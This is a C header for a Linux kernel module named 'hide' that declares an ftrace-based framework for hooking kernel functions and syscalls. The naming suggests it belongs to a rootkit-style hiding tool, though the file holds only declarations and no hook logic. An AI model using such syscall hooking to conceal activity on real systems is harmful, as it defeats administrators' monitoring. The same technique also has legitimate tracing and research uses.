#ifndef YHOOK_H
#define YHOOK_H

#include <linux/hashtable.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/list.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/string.h>

#define MODULE_NAME "hide"
#define LOG_PREFIX "hide: "
#define HOOK_FUNCTION_HASH_TABLE_BITS 26

#pragma GCC optimize("-fno-optimize-sibling-calls")//Preventing the tracked function from being called recursively

struct ftrace_hook
{
    const char *symbol_name;//name of function being hooked
    void *hook_function;//address of hooking func
    void **orig_function;//pointer to address of the function being hooked

    unsigned long orig_address;
    struct ftrace_ops ops;
};

extern DECLARE_HASHTABLE(hook_function_list, HOOK_FUNCTION_HASH_TABLE_BITS);

struct hook_function_info {
    const char * hook_function_name;
    struct ftrace_hook* fhooker;
    struct hlist_node node;
};

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

int yhook_init(void);
int hook_function_name_add(const char* fn_name,void *hook_fn,void *orig_fn);
int hook_function_del(const char* fn_name);

#endif